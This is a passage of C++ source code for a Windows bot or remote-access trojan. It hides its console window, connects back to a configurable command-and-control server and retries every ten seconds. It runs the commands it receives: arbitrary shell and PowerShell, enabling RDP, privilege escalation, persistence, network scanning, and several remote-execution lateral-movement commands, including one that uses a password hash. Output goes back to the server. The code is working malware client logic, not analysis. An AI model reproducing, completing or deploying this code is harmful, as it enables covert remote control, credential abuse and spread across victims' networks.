    g_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_socket == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(C2_SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(C2_SERVER_IP.c_str());
    
    if (connect(g_socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(g_socket);
        WSACleanup();
        return false;
    }
    
    return true;
}

void sendResponse(const std::string& data) {
    if (g_socket != INVALID_SOCKET) {
        send(g_socket, data.c_str(), data.length(), 0);
    }
}

void handleCommand(const std::string& command) {
    std::string response;
    
    if (command == "sysinfo") {
        response = handleSysinfo();
    }
    else if (command == "enablerdp") {
        response = handleEnableRDP();
    }
    else if (command == "networkscan") {  // NEW: Network scanning command
        response = handleNetworkScan();
    }
    else if (command == "dir") {
        response = handleDir();
    }
    else if (command.find("kill ") == 0) {
        std::string pid = command.substr(5);
        response = handleKill(pid);
    }
    else if (command == "shell") {
        response = handleShell();
    }
    else if (command == "persist") {
        response = handlePersistence();
    }
    else if (command.find("powershell ") == 0) {
        std::string psCommand = command.substr(10); // Remove "powershell " prefix
        response = handlePowerShell(psCommand);
    }
    else if (command.find("launch ") == 0) {
        std::string appName = command.substr(7);
        response = handleLaunch(appName);
    }
    else if (command == "privesc") {  // NEW: Privilege escalation command
        response = handlePrivEsc();
    }
    else if (command.find("privesc ") == 0) {  // NEW: With parameters
        std::string params = command.substr(8);
        size_t spacePos = params.find(' ');
        if (spacePos != std::string::npos) {
            std::string username = params.substr(0, spacePos);
            std::string password = params.substr(spacePos + 1);
            response = handlePrivEsc(username, password);
        } else {
            // Only username provided
            response = handlePrivEsc(params, "");
        }
    }
    else if (command == "help") {
        response = "[HELP] Available commands: sysinfo, enablerdp, dir, kill <pid>, launch <app/file>, privesc [username] [password], shell, persist, networkscan, help, exit\n";
    }
    else if (command == "exit") {
        response = "[+] Goodbye\n";
        g_running = false;
    }
    // ==================== LATERAL MOVEMENT COMMANDS ====================
    else if (command.find("rexec1 ") == 0) {
        std::string args = command.substr(7); // remove "rexec1 "
    // Expected format: rexec1 \\\\target command
        size_t spacePos = args.find(' ');
        if (spacePos != std::string::npos) {
            std::string target = args.substr(0, spacePos);
            std::string cmd = args.substr(spacePos + 1);
            response = handleRexec1(target, cmd);
        } else {
            response = "[ERROR] Invalid rexec1 format. Use: rexec1 \\\\target command\n";
        }
    }
    else if (command.find("rexec2 ") == 0) {
        std::string args = command.substr(7);
        size_t spacePos = args.find(' ');
        if (spacePos != std::string::npos) {
            std::string target = args.substr(0, spacePos);
            std::string cmd = args.substr(spacePos + 1);
            response = handleRexec2(target, cmd);
        } else {
            response = "[ERROR] Invalid rexec2 format. Use: rexec2 target command\n";
        }
    }
    else if (command.find("rexec3 ") == 0) {
        std::string args = command.substr(7);
        size_t spacePos = args.find(' ');
        if (spacePos != std::string::npos) {
            std::string share = args.substr(0, spacePos);
            std::string cmd = args.substr(spacePos + 1);
            response = handleRexec3(share, cmd);
        } else {
            response = "[ERROR] Invalid rexec3 format. Use: rexec3 \\\\target\\share command\n";
        }
    }
    else if (command.find("rexec4 ") == 0) {
        std::string args = command.substr(7);
        size_t spacePos = args.find(' ');
        if (spacePos != std::string::npos) {
            std::string target = args.substr(0, spacePos);
            std::string cmd = args.substr(spacePos + 1);
            response = handleRexec4(target, cmd);
        } else {
            response = "[ERROR] Invalid rexec4 format. Use: rexec4 target command\n";
        }
    }
    else if (command.find("rexec5 ") == 0) {
        std::string args = command.substr(7);
    // Format: rexec5 target user hash command
    // We'll split into 4 parts – simplified for demo
        size_t space1 = args.find(' ');
        if (space1 != std::string::npos) {
            size_t space2 = args.find(' ', space1 + 1);
            if (space2 != std::string::npos) {
                size_t space3 = args.find(' ', space2 + 1);
                if (space3 != std::string::npos) {
                    std::string target = args.substr(0, space1);
                    std::string user = args.substr(space1 + 1, space2 - space1 - 1);
                    std::string hash = args.substr(space2 + 1, space3 - space2 - 1);
                    std::string cmd = args.substr(space3 + 1);
                    response = handleRexec5(target, user, hash, cmd);
                }
            }
        }
        if (response.empty()) {
            response = "[ERROR] Invalid rexec5 format. Use: rexec5 target user hash command\n";
        }
    }
    else {
        // Execute as shell command
        std::string cmd = command;
        response = "[COMMAND] Executing: " + cmd + "\n";
        response += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
        response += executeCommand(cmd);
        if (response.find_last_of('\n') != response.length() - 1) {
            response += "\n";
        }
    }
    
    sendResponse(response);
}

// ==================== MAIN LOOP ====================

void botLoop() {
    // Send initial system info
    std::string sysinfo = handleSysinfo();
    sendResponse(sysinfo);
    
    char buffer[BUFFER_SIZE];
    
    while (g_running) {
        int bytes = recv(g_socket, buffer, BUFFER_SIZE - 1, 0);
        
        if (bytes > 0) {
            buffer[bytes] = '\0';
            std::string command(buffer);
            
            // Remove trailing newline
            if (!command.empty() && command.back() == '\n') {
                command.pop_back();
            }
            if (!command.empty() && command.back() == '\r') {
                command.pop_back();
            }
            
            handleCommand(command);
        }
        else if (bytes == 0) {
            // Server disconnected
            break;
        }
        
        Sleep(100);
    }
}

// ==================== ENTRY POINT ====================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Parse command line arguments
    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if (argc >= 3) {
        // Convert wide char to string
        char ipBuffer[256];
        wcstombs(ipBuffer, argv[1], 256);
        C2_SERVER_IP = ipBuffer;
        
        char portBuffer[256];
        wcstombs(portBuffer, argv[2], 256);
        C2_SERVER_PORT = atoi(portBuffer);
    }
    
    LocalFree(argv);
    
    // HIDE THE CONSOLE WINDOW
    HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
    
    // Main connection loop
    while (g_running) {
        if (connectToServer()) {
            botLoop();
            
            if (g_running) {
                Sleep(10000);  // Reconnect after 10 seconds
            }
        } else {
            Sleep(10000);  // Retry after 10 seconds
        }
    }
    
    closesocket(g_socket);
    WSACleanup();
    return 0;
}